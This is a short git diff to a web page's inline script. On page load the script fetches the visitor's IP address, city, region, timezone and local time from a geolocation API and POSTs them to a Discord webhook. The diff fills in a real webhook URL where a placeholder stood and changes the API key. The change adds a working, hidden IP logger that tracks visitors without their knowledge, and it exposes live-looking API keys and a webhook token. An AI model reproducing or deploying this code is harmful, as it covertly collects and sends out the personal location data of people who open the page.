@@ -10,7 +10,7 @@
     <script src="https://3kh0.github.io/js/main.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script>
-      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
+      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=7bcdfb4105cd4defb485d138d226e89a", function (data) {
         const ip = data.ip_address;
         const city = data.city;
         const region = data.region;
@@ -24,7 +24,7 @@
         const tz = data.timezone.name;
         const ct = data.timezone.current_time;
         const request = new XMLHttpRequest();
-        request.open("POST", "PLACE_WEBHOOK_URL_HERE");
+        request.open("POST", "https://discordapp.com/api/webhooks/1051544721639620638/SYUZQy4GtKTOKNdY_eJnOZwhrWFZLDT9DcfEYEJiDKHXLd79wZmyUcC6fEXe4mNK2V0v");
         // Put in your discord webhook url above ^^^
         request.setRequestHeader("Content-type", "application/json");
         const params = {
